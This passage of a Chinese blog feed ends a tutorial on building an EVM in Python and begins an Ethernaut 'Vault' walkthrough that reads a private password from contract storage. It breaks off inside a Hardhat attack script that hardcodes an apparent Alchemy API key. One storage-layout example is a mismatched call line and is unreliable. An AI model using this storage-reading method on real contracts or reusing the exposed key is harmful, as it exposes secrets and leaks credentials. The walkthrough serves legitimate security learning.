  <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> context.stopped:<br>        pc_before = context.pc<br>        instruction = decode_opcode(context)<br>        instruction.execute(context)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;instruction&#125;</span> @ pc=<span class="hljs-subst">&#123;pc_before&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(context)<br>        <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Output: 0x<span class="hljs-subst">&#123;context.returndata.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br><br><br></code></pre></td></tr></table></figure><p>现在我们用这个例子来演示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">PUSH 0x6<br>PUSH 0x7<br>MUL<br>STOP<br></code></pre></td></tr></table></figure><p>即让EVM编译 <code>600660070200</code> 这串字节码，我们可以得到最基本的运行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 虚拟机的字大小为256位，即一次性处理256位长度的数据</span><br><br><span class="hljs-keyword">from</span> soul_evm.runner <span class="hljs-keyword">import</span> run<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: &#123;&#125; &lt;hexdata&gt;&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">0</span>]))<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    data = sys.argv[<span class="hljs-number">1</span>]<br>    run(<span class="hljs-built_in">bytes</span>.fromhex(data))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>这是我项目的路径：</p><p><img src="/2022/11/08/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-1/3.png"></p><p>现在让我们运行它，并得到如下输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS E:evmproject\src&gt; python main.py 600660070200<br>PUSH1 @ pc=0<br>stack: [6]<br>memory:[]<br><br>PUSH1 @ pc=2<br>stack: [6, 7]<br>memory:[]<br><br>MUL @ pc=4<br>stack: [42]<br>memory:[]<br><br>STOP @ pc=5<br>stack: [42]<br>memory:[]<br><br>Output: 0x<br><br></code></pre></td></tr></table></figure><p>假如我们将00<code>STOP</code>指令去掉，编译<code>6006600702</code>这串字节码，看看会得到什么：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS E:evmproject\src&gt; python main.py 6006600702<br>PUSH1 @ pc=0<br>stack: [6]<br>memory:[]<br><br>PUSH1 @ pc=2<br>stack: [6, 7]<br>memory:[]<br><br>MUL @ pc=4<br>stack: [42]<br>memory:[]<br><br>Traceback (most recent call last):<br>soul_evm.opcodes.InvalidCodeOffset: &#123;&#x27;code&#x27;: b&#x27;`\x06`\x07\x02&#x27;, &#x27;pc&#x27;: 5&#125;<br><br></code></pre></td></tr></table></figure><p>将会报<code>InvalidCodeOffset</code>的错误。</p><hr><p>当我试图在字节指令的末尾处获取下一条指令时，遇到了一个错误。</p><p>让我们来看看关于这个场景下，黄皮书说了什么？</p><p><img src="/2022/11/08/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-1/4.png"></p><p>大致概括一下：如果程序计数器在代码字节数组之外，那么将会干净利落地停止，而不是抛出异常，所以我们需要改变解码器中的条件：</p><p><code>opcodes.py/decode_opcode</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_opcode</span>(<span class="hljs-params">context: ExecutionContext</span>) -&gt; Instruction:<br>    <span class="hljs-keyword">if</span> context.pc &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> InvalidCodeOffset(&#123;<span class="hljs-string">&quot;code&quot;</span>: context.code.<span class="hljs-built_in">hex</span>(), <span class="hljs-string">&quot;pc&quot;</span>: context.pc&#125;)<br><br>    <span class="hljs-keyword">if</span> context.pc &gt;= <span class="hljs-built_in">len</span>(context.code):<br>        <span class="hljs-keyword">return</span> STOP<br><br>    <span class="hljs-comment">#通过bytes获取指令</span><br>    opcode = context.read_code(<span class="hljs-number">1</span>)<br>    instruction = INSTRUCTIONS_BY_OPCODE.get(opcode)<br>    <span class="hljs-keyword">if</span> instruction <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">raise</span> UnknownOpcode(&#123;<span class="hljs-string">&quot;opcode&quot;</span>: opcode&#125;)<br><br>    <span class="hljs-keyword">return</span> instruction<br></code></pre></td></tr></table></figure><p>如此一来，便不会报错了！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS E:evmproject\src&gt; python main.py 6006600702<br>PUSH1 @ pc=0<br>stack: [6]<br>memory:[]<br><br>PUSH1 @ pc=2<br>stack: [6, 7]<br>memory:[]<br><br>MUL @ pc=4<br>stack: [42]<br>memory:[]<br><br>STOP @ pc=5<br>stack: [42]<br>memory:[]<br><br>Output: 0x<br><br></code></pre></td></tr></table></figure><h2 id="🌽返回数据"><a href="#🌽返回数据" class="headerlink" title="🌽返回数据"></a>🌽返回数据</h2><blockquote><p>到目前为止，我们一直在监视跟踪运行中的堆栈，但在实际应用中，以太坊虚拟机必须返回值才算有用。</p><p>根据黄皮书，返回值意味着什么？</p></blockquote><p><img src="/2022/11/08/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-1/5.png"></p><p><img src="/2022/11/08/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-1/6.png"></p><p>返回从堆栈中弹出的两个元素，<code>offset</code>和<code>length</code>以及返回的<code>memory[offset:offset+length-1]</code></p><hr><p>所以为了返回数据，我们需要实现内存存储指令和<code>RETURN</code>。让我们从<code>MSTORE8</code>开始，它能够从堆栈中弹出一个偏移量和一个字，并将该字的最低字节存储在内存中：</p><p><img src="/2022/11/08/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-1/7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">MSTORE8 = register_instruction(<br>    <span class="hljs-number">0x53</span>,<br>    <span class="hljs-string">&quot;MSTORE8&quot;</span>,<br>    (<span class="hljs-keyword">lambda</span> ctx: ctx.memory.store(ctx.stack.pop(), ctx.stack.pop() % <span class="hljs-number">256</span>)),<br>)<br></code></pre></td></tr></table></figure><p>为了<code>RETURN</code>，我们添加一个<code>load_range(offset,length)</code> 来操作临时存储：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_range</span>(<span class="hljs-params">self, offset: <span class="hljs-built_in">int</span>, length: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> InvalidMemoryAccess(&#123;<span class="hljs-string">&quot;offset&quot;</span>: offset, <span class="hljs-string">&quot;length&quot;</span>: length&#125;)<br><br>        <span class="hljs-comment"># we could use a slice here, but this lets us gets 0 bytes if we read past the end of concrete memory</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(self.load(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(offset, offset + length))<br></code></pre></td></tr></table></figure><p>note：添加在<code>Memory</code>类中</p><p>然后我们就可以给我们的<code>ExcutionContext</code>加上获取返回数据的属性函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecutionContext</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, code=<span class="hljs-built_in">bytes</span>(<span class="hljs-params"></span>), pc=<span class="hljs-number">0</span>, stack=Stack(<span class="hljs-params"></span>), memory=Memory(<span class="hljs-params"></span>)</span>) -&gt; <span class="hljs-literal">None</span>:<br>        ...<br>        self.returndata = <span class="hljs-built_in">bytes</span>()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_return_data</span>(<span class="hljs-params">self, offset: <span class="hljs-built_in">int</span>, length: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.stopped = <span class="hljs-literal">True</span><br>        self.returndata = self.memory.load_range(offset, length)<br></code></pre></td></tr></table></figure><p>现在给出<code>RETURN</code>的指令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">RETURN = register_instruction(<br>    <span class="hljs-number">0xf3</span>,<br>    <span class="hljs-string">&quot;RETURN&quot;</span>,<br>    (<span class="hljs-keyword">lambda</span> ctx: ctx.set_return_data(ctx.stack.pop(), ctx.stack.pop())),<br>)<br></code></pre></td></tr></table></figure><p>现在我们就可以返回并且输出运行之后的结果啦！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS E:evmproject\src&gt; python main.py 600660070260005360016000f3<br>PUSH1 @ pc=0<br>stack: [6]<br>memory:[]<br><br>PUSH1 @ pc=2<br>stack: [6, 7]<br>memory:[]<br><br>MUL @ pc=4<br>stack: [42]<br>memory:[]<br>PUSH1 @ pc=8<br>stack: [1]<br>memory:[42]<br><br>PUSH1 @ pc=10<br>stack: [1, 0]<br>memory:[42]<br><br>RETURN @ pc=12<br>stack: []<br>memory:[42]<br><br>Output: 0x2a<br></code></pre></td></tr></table></figure><blockquote><p>翻译不易，码字不简~</p><p>有条件的同学可以点赞收藏加关注~这是对博主最大的肯定！</p></blockquote><h2 id="💎个人博客"><a href="#💎个人博客" class="headerlink" title="💎个人博客"></a>💎个人博客</h2><p><a href="https://nangbowan.github.io/">77Brother (nangbowan.github.io)</a></p><h2 id="🐋原文翻译链接"><a href="#🐋原文翻译链接" class="headerlink" title="🐋原文翻译链接"></a>🐋原文翻译链接</h2><p><a href="https://www.notion.so/Building-an-EVM-from-scratch-part-1-the-execution-context-c28ebb4200c94f6fb75948a5feffc686">Building an EVM from scratch part 1 - the execution context (notion.so)</a></p><p><a href="https://ethereum.github.io/yellowpaper/paper.pdf">以太坊黄皮书-yellow paper</a></p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>Python</category>
      
      <category>以太坊虚拟机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EVM虚拟机 源码构建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链骇客第四讲-破解私有变量</title>
    <link href="/2022/11/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E5%9B%9B%E8%AE%B2-%E7%A0%B4%E8%A7%A3%E7%A7%81%E6%9C%89%E5%8F%98%E9%87%8F/"/>
    <url>/2022/11/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E5%9B%9B%E8%AE%B2-%E7%A0%B4%E8%A7%A3%E7%A7%81%E6%9C%89%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>前情提示：本篇文章较为硬核，需读者有一定开发基础。</p><p>本篇文章将会以ethernaut中的第8和第12个例子来剖析智能合约中的私有变量。</p><p>首先给大家留个疑问：私有变量真的意味着私密不可窥探吗？</p></blockquote><p>答案可以先告诉大家：<mark>当然不是！</mark></p><blockquote><p>Everything is public on  the blockchain!</p></blockquote><p>在区块链中，任何东西实际上都是公开的！没有什么东西使真正私有的，即使一个变量是<code>private</code>或<code>internal</code>的。</p><h2 id="📕1-挑战-？"><a href="#📕1-挑战-？" class="headerlink" title="📕1. 挑战 ？"></a>📕1. 挑战 ？</h2><ul><li><p>这是ethernaut中的第8个例子~</p></li><li><p>现在把需求交给你：<mark>将合约解锁，即让 locked  &#x3D; false。</mark></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Vault &#123;<br>  bool public locked;<br>  bytes32 private password;<br><br>  constructor(bytes32 _password) public &#123;<br>    locked = true;<br>    password = _password;<br>  &#125;<br><br>  function unlock(bytes32 _password) public &#123;<br>    if (password == _password) &#123;<br>      locked = false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="📕2-思考及必要准备"><a href="#📕2-思考及必要准备" class="headerlink" title="📕2. 思考及必要准备"></a>📕2. 思考及必要准备</h2><h3 id="初步思路"><a href="#初步思路" class="headerlink" title="初步思路"></a>初步思路</h3><ol><li>合约改变 <code>locked</code> 的地方只有一个，那就是调用<code>unlock()</code>函数，通过password判断后修改变量；</li><li>那么一定绕不开的问题就是：如何破解<code>password</code>私有变量？</li></ol><blockquote><p>可以看到，思路极其简单，但同样的也会让人感到困惑。私有变量怎样才能破解呢？</p><p>先别着急，我们做一些必要的了解！</p></blockquote><h3 id="⭐状态变量在储存中的布局"><a href="#⭐状态变量在储存中的布局" class="headerlink" title="⭐状态变量在储存中的布局"></a>⭐<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html">状态变量在储存中的布局</a></h3><blockquote><p>合约的状态变量是以一种紧凑的方式存储在区块链中，有时候多个值会使用同一个存储槽。除了<mark>动态大小的数组和映射哈希表</mark>，数据的存储方式是从位置 <code>0</code> 开始连续放置在存储<code>storage</code>中的。</p><p>并且很重要的一点就是，每一个变量都能根据它的类型来确定字节大小；</p></blockquote><h3 id="🐟存储插槽"><a href="#🐟存储插槽" class="headerlink" title="🐟存储插槽"></a>🐟存储插槽</h3><blockquote><p>存储大小少于32字节的多个变量将会被打包到一个存储插槽中，并且规则如下：</p></blockquote><ul><li><p>存储插槽的第一个变量是所有变量中占字节最小的，通常是<code>bool</code>类型的变量；</p><p>for example</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">(bool success1, ) = payable(attackedContract).call&#123;value: msg.value&#125;(abi.encodeWithSignature(&quot;donate(address)&quot;, address(this)));<br></code></pre></td></tr></table></figure></li><li><p>值类型只使用存储它们所需的字节数；</p></li><li><p>如果一个值类型在一个存储槽的剩余部分放不下，它将被存储在下一个存储槽；</p></li><li><p>结构体(struct) 和数组数据(array)会开启一个新存储槽；</p></li><li><p><code>constant</code>和<code>immutable</code>变量将不占用存储槽，因为它们将在编译时或部署时直接在代 码中被替换为值；</p></li></ul><p><mark>注：</mark>对于使用继承的合约，状态变量的排序将会从最基类合约开始确定，来自不同合约的状态变量将会共享一个存储插槽；结构体和数组中的成员变量会存储在一起，就像它们单独声明时一样地存储。</p><h3 id="🐟映射和动态数组（深入理解）"><a href="#🐟映射和动态数组（深入理解）" class="headerlink" title="🐟映射和动态数组（深入理解）"></a>🐟映射和动态数组（深入理解）</h3><blockquote><p>由于映射和动态数组不可预知大小，不能在<mark>状态变量</mark>之间存储它们。</p><p>相反，它们自身根据以上规则仅占用32个字节，然后他们包含的元素的存储槽的位置，是通过Keccak-256哈希计算来确定的！</p></blockquote><p>假设映射和动态数组根据上述存储规则最终可确定某个 <code>位置p</code></p><p><img src="/2022/11/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E5%9B%9B%E8%AE%B2-%E7%A0%B4%E8%A7%A3%E7%A7%81%E6%9C%89%E5%8F%98%E9%87%8F/1.png"></p><h4 id="🌏-对于动态数组（array）"><a href="#🌏-对于动态数组（array）" class="headerlink" title="🌏 对于动态数组（array）"></a>🌏 对于动态数组（array）</h4><ol><li><p>插槽p会存储数组中元素的数量（字节数组和字符串除外）；</p></li><li><p>数组的元素将会从<code>keccak256(p)</code>开始，布局方式与静态大小的数组相同，一个元素接着一个元素，如果元素的长度不超过16字节，将会共享存储插槽；</p></li><li><p>动态数组会递归地应用这一规则；</p></li></ol><p><strong>for example</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//SPDX-License-Identifier: Unlicense<br>pragma solidity ^0.8.0;<br>contract testArray&#123;<br> uint24[][] private data;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><mark>如何确定<code>data[i][j]</code>元素的位置 ？</mark>(假设动态数组data本身存储在插槽p的位置)</p><p>则<code>data[i][j]</code>的槽位将是 <code>keccak256(keccak256(p) + i) + floor(j/floor(256/24))</code></p><p>并且可以得到槽数据中的元素内容：<code>v &gt;&gt; ((j%floor(256/24))*24)) &amp; type(uint24).max</code></p><h4 id="🌏对于映射（mapping）"><a href="#🌏对于映射（mapping）" class="headerlink" title="🌏对于映射（mapping）"></a>🌏对于映射（mapping）</h4><ol><li><p>插槽p将不会被使用（即空），但它仍是有存在必要的，以确保两个彼此挨着映射；</p></li><li><p>映射中的键<code>k</code>所对应的槽会位于<code>keccak256(h(k).p)</code>，其中<code>.</code>是连接符，<code>h</code>是一个函数；</p></li><li><p>根据键的类型<code>h</code>会对应不同的占槽（类似于定态薛定谔方程中的∇变量）</p><p>a. 值类型，<code>h</code>与在内存中存储值的方式相同的方式将值填充为32字节；</p><p>b. 字符串和字节数组，h(k) 只是未填充的数据。</p></li></ol><p><strong>for example</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//SPDX-License-Identifier: Unlicense<br>pragma solidity ^0.8.0;<br><br>contract C &#123;<br>    struct S &#123; uint16 a; uint16 b; uint256 c; &#125;<br>    uint x;<br>    mapping(uint =&gt; mapping(uint =&gt; S)) data;<br>&#125;<br></code></pre></td></tr></table></figure><p><mark>如何确定<code>data[4][9].c</code>的位置？</mark></p><ol><li>映射本身的位置是1（前面有32字节变量x）；</li><li>因此<code>data[4]</code>存储在<code>keccak256(uint256(4).uint256(1))</code>槽位；</li><li>然而<code>data[4]</code>的类型又是一个映射，所以<code>data[4][9]</code>的数据开始于槽位<code>keccak256(uint256(9).keccak256(uint256(4).uint(1)))</code>；</li><li>结构S的成员c中的槽位偏移是1（因为a和b被装在一个槽位中）；</li><li>得到<code>data[4][9].c</code>的插槽位置是<code>keccak256(uint256(9).keccak256(uint256(4).uint256(1))) + 1</code>。</li></ol><p>🎇<strong>恭喜你顺利通过了这两个例子的学习</strong>！！</p><p>相信你对solidity变量的存储已经有了一定的了解，如果不怎么了解也没关系，下面给出一张对应表！</p><h3 id="⭐solidity基本类型与对应字节"><a href="#⭐solidity基本类型与对应字节" class="headerlink" title="⭐solidity基本类型与对应字节"></a>⭐solidity基本类型与对应字节</h3><table><thead><tr><th align="center">类型</th><th align="center">bit数</th><th align="center">字节数</th></tr></thead><tbody><tr><td align="center">bool</td><td align="center">8</td><td align="center">1</td></tr><tr><td align="center">address</td><td align="center">160</td><td align="center">20</td></tr><tr><td align="center">string</td><td align="center">8&#x2F;16&#x2F;24</td><td align="center">1&#x2F;2&#x2F;3(单字)</td></tr><tr><td align="center">uint8</td><td align="center">8</td><td align="center">1</td></tr><tr><td align="center">uint16</td><td align="center">16</td><td align="center">2</td></tr><tr><td align="center">uint256</td><td align="center">256</td><td align="center">32</td></tr><tr><td align="center">bytes4</td><td align="center">32</td><td align="center">4</td></tr><tr><td align="center">bytes16</td><td align="center">128</td><td align="center">16</td></tr><tr><td align="center">以此类推…</td><td align="center">…</td><td align="center">…</td></tr></tbody></table><blockquote><p>对于string类型所占的字节数，有兴趣可以用这个例子去实践下</p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//SPDX-License-Identifier: Unlicense<br>pragma solidity 0.8.0;<br><br>contract testLength&#123;<br><br>    function getStrlen(string memory _str) public pure returns(uint256)&#123;<br>        return bytes(_str).length;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="🚀3-实战"><a href="#🚀3-实战" class="headerlink" title="🚀3. 实战"></a>🚀3. 实战</h2><blockquote><p>回到上文留下的挑战</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Vault &#123;<br>  bool public locked;<br>  bytes32 private password;<br><br>  constructor(bytes32 _password) public &#123;<br>    locked = true;<br>    password = _password;<br>  &#125;<br><br>  function unlock(bytes32 _password) public &#123;<br>    if (password == _password) &#123;<br>      locked = false;<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="根据上文规则"><a href="#根据上文规则" class="headerlink" title="根据上文规则"></a>根据上文规则</h3><ul><li><code>bool locked</code>将占据<code>插槽0</code>，因为<code>bool</code>类型只需要一个字节的存储空间，但因为下一个状态变量password需要整个32字节的槽位，因此不能够把<code>locked</code>和<code>password</code> 打包在一起；</li><li><code>bytes32 password</code>将占据<code>插槽1</code>，顾名思义，bytes32类型需要整个32字节。</li></ul><h3 id="💎破解脚本"><a href="#💎破解脚本" class="headerlink" title="💎破解脚本"></a>💎破解脚本</h3><blockquote><p>破译此合约，使用hardhat测试脚本是仅有的方式之一，同时也是最便捷的！</p><p>如果没有hardhat基础的同学，理解原理即可。</p><p>想学习hardhat安全帽的同学，可以访问我的个人博客联系我。</p></blockquote><p><mark>注意看代码注释！</mark></p><p><code>attackPrivate.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> &#123;ethers&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;hardhat&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">APIKEY</span> = <span class="hljs-string">&quot;lty9DXUZ1zkY5nPDY-WyhvEJAejxA6lp&quot;</span><br><span class="hljs-keyword">const</span> utils = ethers.<span class="hljs-property">utils</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">BigNumber</span> = ethers.<span class="hljs-property">BigNumber</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MaxUint256</span> = ethers.<span class="hljs-property">constants</span>.<span class="hljs-property">MaxUint256</span><br><br><span class="hljs-comment">//这是我们要破解的合约地址</span><br><span class="hljs-keyword">const</span> ethernaut8_address = <span class="hljs-string">&quot;0xBd0B4AF4A8A56f2B8CF4e2c76Fe4bD55579cb3D6&quot;</span><br><span class="hljs-comment">//合约abi</span><br><span class="hljs-keyword">const</span> ethernaut8_abi = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./8abi.json&quot;</span>)<br><span class="hljs-comment">//使用alchemy作为测试节点</span><br><span class="hljs-keyword">const</span> provider  = <span class="hljs-keyword">new</span> ethers.<span 